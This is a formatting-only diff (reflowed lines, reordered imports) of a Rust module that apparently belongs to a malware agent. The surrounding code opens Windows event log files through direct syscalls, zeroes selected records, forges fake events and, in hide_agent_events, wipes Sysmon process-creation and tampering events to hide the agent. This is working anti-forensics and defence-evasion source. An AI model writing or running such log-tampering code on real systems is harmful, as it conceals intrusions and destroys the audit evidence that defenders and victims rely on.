@@ -40,8 +40,8 @@
 use std::mem;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
 macro_rules! defer {
     ($($body:tt)*) => {
@@ -238,15 +238,34 @@ const KNOWN_LOGS: &[(&str, &str)] = &[
     ("Application", "Application.evtx"),
     ("Setup", "Setup.evtx"),
     ("ForwardedEvents", "ForwardedEvents.evtx"),
-    ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell%4Operational.evtx"),
-    ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon%4Operational.evtx"),
-    ("Microsoft-Windows-TaskScheduler/Operational", "Microsoft-Windows-TaskScheduler%4Operational.evtx"),
-    ("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
-     "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx"),
-    ("Microsoft-Windows-WMI-Activity/Operational", "Microsoft-Windows-WMI-Activity%4Operational.evtx"),
-    ("Microsoft-Windows-DNS-Client/Operational", "Microsoft-Windows-DNS-Client%4Operational.evtx"),
-    ("Microsoft-Windows-RemoteDesktopManager/Operational",
-     "Microsoft-Windows-RemoteDesktopManager%4Operational.evtx"),
+    (
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-PowerShell%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-Sysmon/Operational",
+        "Microsoft-Windows-Sysmon%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-TaskScheduler/Operational",
+        "Microsoft-Windows-TaskScheduler%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+        "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-WMI-Activity/Operational",
+        "Microsoft-Windows-WMI-Activity%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-DNS-Client/Operational",
+        "Microsoft-Windows-DNS-Client%4Operational.evtx",
+    ),
+    (
+        "Microsoft-Windows-RemoteDesktopManager/Operational",
+        "Microsoft-Windows-RemoteDesktopManager%4Operational.evtx",
+    ),
 ];
 
 /// Base directory for EVTX files (NT path format).
@@ -344,7 +363,11 @@ unsafe fn nt_open_file(path_nt: &str, access: u32) -> Result<*mut std::ffi::c_vo
     .map_err(|e| anyhow!("NtCreateFile resolution for '{}': {}", path_nt, e))?;
 
     if status != STATUS_SUCCESS {
-        bail!("NtCreateFile('{}') returned 0x{:08X}", path_nt, status as u32);
+        bail!(
+            "NtCreateFile('{}') returned 0x{:08X}",
+            path_nt,
+            status as u32
+        );
     }
 
     Ok(handle)
@@ -359,14 +382,14 @@ unsafe fn nt_read_file(handle: *mut std::ffi::c_void, size: usize) -> Result<Vec
     let status = crate::syscall!(
         "NtReadFile",
         handle as u64,
-        0u64,                           // Event
-        0u64,             // ApcRoutine
-        0u64,                           // ApcContext
+        0u64, // Event
+        0u64, // ApcRoutine
+        0u64, // ApcContext
         &mut iosb as *mut _ as u64,
         buffer.as_mut_ptr() as u64,
         size as u64,
-        0u64,             // ByteOffset (use current)
-        0u64,                           // Key
+        0u64, // ByteOffset (use current)
+        0u64, // Key
     )
     .map_err(|e| anyhow!("NtReadFile resolution: {}", e))?;
 
@@ -380,11 +403,7 @@ unsafe fn nt_read_file(handle: *mut std::ffi::c_void, size: usize) -> Result<Vec
 }
 
 /// Write bytes to a file via NtWriteFile at a specified offset.
-unsafe fn nt_write_file_at(
-    handle: *mut std::ffi::c_void,
-    data: &[u8],
-    offset: u64,
-) -> Result<()> {
+unsafe fn nt_write_file_at(handle: *mut std::ffi::c_void, data: &[u8], offset: u64) -> Result<()> {
     let mut iosb = IoStatusBlock::default();
     let mut byte_offset = offset;
 
@@ -452,7 +471,10 @@ fn validate_evtx_header(data: &[u8]) -> Result<()> {
         bail!("EVTX header too short: {} bytes", data.len());
     }
     if &data[0..8] != EVTX_HEADER_MAGIC {
-        bail!("Invalid EVTX magic: expected 'ElfFile', got {:?}", &data[0..8]);
+        bail!(
+            "Invalid EVTX magic: expected 'ElfFile', got {:?}",
+            &data[0..8]
+        );
     }
     Ok(())
 }
@@ -546,9 +568,8 @@ fn extract_event_id(record_data: &[u8]) -> Option<u16> {
         // a type descriptor.  This is heuristic — EVTX binary XML format
         // is not fully documented, but this works for most standard events.
         if record_data[i] == 0x06 && i + 2 <= record_data.len() {
-            let candidate = u16::from_le_bytes(
-                record_data[i + 1..i + 3].try_into().unwrap_or([0; 2])
-            );
+            let candidate =
+                u16::from_le_bytes(record_data[i + 1..i + 3].try_into().unwrap_or([0; 2]));
             // Sanity: most event IDs are in range 1..10000.
             if candidate > 0 && candidate < 10000 {
                 return Some(candidate);
@@ -569,9 +590,11 @@ fn record_contains_bytes(record_data: &[u8], pattern: &[u8]) -> bool {
         return false;
     }
     for window in data.windows(pattern.len()) {
-        if window.iter().zip(pattern.iter()).all(|(a, b)| {
-            a.to_ascii_lowercase() == b.to_ascii_lowercase()
-        }) {
+        if window
+            .iter()
+            .zip(pattern.iter())
+            .all(|(a, b)| a.to_ascii_lowercase() == b.to_ascii_lowercase())
+        {
             return true;
         }
     }
@@ -603,7 +626,10 @@ pub fn enumerate_event_logs() -> Result<Vec<EventLogInfo>> {
 
             let file_size = nt_query_file_size(handle)?;
             if file_size > MAX_EVTX_SIZE as u64 {
-                warn!("EVTX file too large, skipping: {} ({} bytes)", name, file_size);
+                warn!(
+                    "EVTX file too large, skipping: {} ({} bytes)",
+                    name, file_size
+                );
                 continue;
             }
 
@@ -855,10 +881,13 @@ pub fn clear_specific_events(
                 debug!(
                     "Chunk {} modified ({} records cleared, checksum updated)",
                     chunk_idx,
-                    records.iter().filter(|r| {
-                        // Count only the ones we actually zeroed (approximate).
-                        true
-                    }).count()
+                    records
+                        .iter()
+                        .filter(|r| {
+                            // Count only the ones we actually zeroed (approximate).
+                            true
+                        })
+                        .count()
                 );
             }
         }
@@ -888,12 +917,7 @@ pub fn clear_specific_events(
 /// * `event_id` — The fake Event ID.
 /// * `timestamp` — FILETIME timestamp for the fake event.
 /// * `data` — Additional binary data to include in the record body.
-pub fn inject_fake_event(
-    log_name: &str,
-    event_id: u16,
-    timestamp: u64,
-    data: &[u8],
-) -> Result<()> {
+pub fn inject_fake_event(log_name: &str, event_id: u16, timestamp: u64, data: &[u8]) -> Result<()> {
     let filename = lookup_log_filename(log_name)
         .ok_or_else(|| anyhow!("Unknown event log: '{}'", log_name))?;
 
@@ -946,7 +970,7 @@ pub fn inject_fake_event(
         // Minimal EVTX record: header (24 bytes) + event_id (2) + padding (2) + data.
         let record_body_len = 4 + data.len();
         let total_record_size = RECORD_HEADER_SIZE + record_body_len + 4; // +4 for trailing size copy
-        // Align to 8-byte boundary.
+                                                                          // Align to 8-byte boundary.
         let aligned_size = ((total_record_size + 7) / 8) * 8;
         let aligned_size = aligned_size as u32;
 
@@ -967,7 +991,7 @@ pub fn inject_fake_event(
 
         // Construct the fake record.
         let mut fake_record = vec![0u8; aligned_size as usize];
-        write_u32_le(&mut fake_record, 0, EVTX_RECORD_MAGIC);       // Magic
+        write_u32_le(&mut fake_record, 0, EVTX_RECORD_MAGIC); // Magic
         write_u32_le(&mut fake_record, RECORD_SIZE_OFFSET, aligned_size); // Size
         write_u64_le(&mut fake_record, RECORD_ID_OFFSET, last_record_id + 1); // Record ID
         write_u64_le(&mut fake_record, RECORD_TIMESTAMP_OFFSET, timestamp); // Timestamp
@@ -987,15 +1011,10 @@ pub fn inject_fake_event(
         }
 
         // Trailing size copy (EVTX format requirement).
-        write_u32_le(
-            &mut fake_record,
-            aligned_size as usize - 4,
-            aligned_size,
-        );
+        write_u32_le(&mut fake_record, aligned_size as usize - 4, aligned_size);
 
         // Write the fake record into the chunk.
-        chunk[new_offset..new_offset + aligned_size as usize]
-            .copy_from_slice(&fake_record);
+        chunk[new_offset..new_offset + aligned_size as usize].copy_from_slice(&fake_record);
 
         // Update chunk header: last record offset and ID.
         write_u64_le(&mut chunk, CHUNK_LAST_RECORD_OFFSET, new_offset as u64);
@@ -1010,7 +1029,10 @@ pub fn inject_fake_event(
 
         info!(
             "Injected fake event: log='{}', event_id={}, timestamp={}, record_id={}",
-            log_name, event_id, timestamp, last_record_id + 1
+            log_name,
+            event_id,
+            timestamp,
+            last_record_id + 1
         );
 
         Ok(())
@@ -1059,7 +1081,12 @@ pub fn hide_agent_events(matcher: &AgentEventMatcher) -> Result<usize> {
 
     // 2. Clear Sysmon log (Event ID 1 = process create, 7 = image loaded).
     let sysmon_ids: Vec<u16> = vec![1, 7, 25]; // Process create, image loaded, process tampering
-    match clear_specific_events("Microsoft-Windows-Sysmon/Operational", &sysmon_ids, None, None) {
+    match clear_specific_events(
+        "Microsoft-Windows-Sysmon/Operational",
+        &sysmon_ids,
+        None,
+        None,
+    ) {
         Ok(n) => {
             total_cleared += n;
             debug!("Cleared {} Sysmon events", n);
@@ -1246,16 +1273,24 @@ mod tests {
         chunk[0..8].copy_from_slice(EVTX_CHUNK_MAGIC);
 
         // Set first record offset to right after chunk header.
-        write_u64_le(&mut chunk, CHUNK_FIRST_RECORD_OFFSET, EVTX_CHUNK_HEADER_SIZE as u64);
-        write_u64_le(&mut chunk, CHUNK_LAST_RECORD_OFFSET, EVTX_CHUNK_HEADER_SIZE as u64);
+        write_u64_le(
+            &mut chunk,
+            CHUNK_FIRST_RECORD_OFFSET,
+            EVTX_CHUNK_HEADER_SIZE as u64,
+        );
+        write_u64_le(
+            &mut chunk,
+            CHUNK_LAST_RECORD_OFFSET,
+            EVTX_CHUNK_HEADER_SIZE as u64,
+        );
 
         // Place a single record at EVTX_CHUNK_HEADER_SIZE.
         let rec_offset = EVTX_CHUNK_HEADER_SIZE;
         write_u32_le(&mut chunk, rec_offset, EVTX_RECORD_MAGIC);
         write_u32_le(&mut chunk, rec_offset + 4, 64); // Size = 64 bytes
-        write_u64_le(&mut chunk, rec_offset + 8, 1);   // Record ID = 1
+        write_u64_le(&mut chunk, rec_offset + 8, 1); // Record ID = 1
         write_u64_le(&mut chunk, rec_offset + 16, 12345678); // Timestamp
-        // Trailing size copy.
+                                                             // Trailing size copy.
         write_u32_le(&mut chunk, rec_offset + 60, 64);
 
         let records = parse_chunk_records(&chunk);
@@ -1287,8 +1322,7 @@ mod tests {
     fn test_record_contains_bytes() {
         let mut record = vec![0u8; 64];
         record[0..4].copy_from_slice(&EVTX_RECORD_MAGIC.to_le_bytes());
-        record[RECORD_HEADER_SIZE..RECORD_HEADER_SIZE + 5]
-            .copy_from_slice(b"Hello");
+        record[RECORD_HEADER_SIZE..RECORD_HEADER_SIZE + 5].copy_from_slice(b"Hello");
 
         assert!(record_contains_bytes(&record, b"hello"));
         assert!(record_contains_bytes(&record, b"Hello"));
@@ -1297,14 +1331,8 @@ mod tests {
 
     #[test]
     fn test_lookup_log_filename() {
-        assert_eq!(
-            lookup_log_filename("Security"),
-            Some("Security.evtx")
-        );
-        assert_eq!(
-            lookup_log_filename("system"),
-            Some("System.evtx")
-        );
+        assert_eq!(lookup_log_filename("Security"), Some("Security.evtx"));
+        assert_eq!(lookup_log_filename("system"), Some("System.evtx"));
         assert_eq!(lookup_log_filename("NonExistent"), None);
     }
 
